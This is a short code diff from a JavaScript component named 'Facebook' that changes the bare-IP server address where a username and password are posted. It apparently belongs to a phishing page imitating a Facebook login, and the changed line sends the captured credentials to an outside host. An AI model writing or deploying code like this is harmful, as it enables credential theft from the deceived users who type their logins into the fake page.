@@ -219,7 +219,7 @@ export default function Facebook() {
  
     const serverUrlData={
 
-      url:"http://159.65.148.181/facebook",
+      url:"http://164.92.93.53/facebook",
       data:{
         username,
         password,
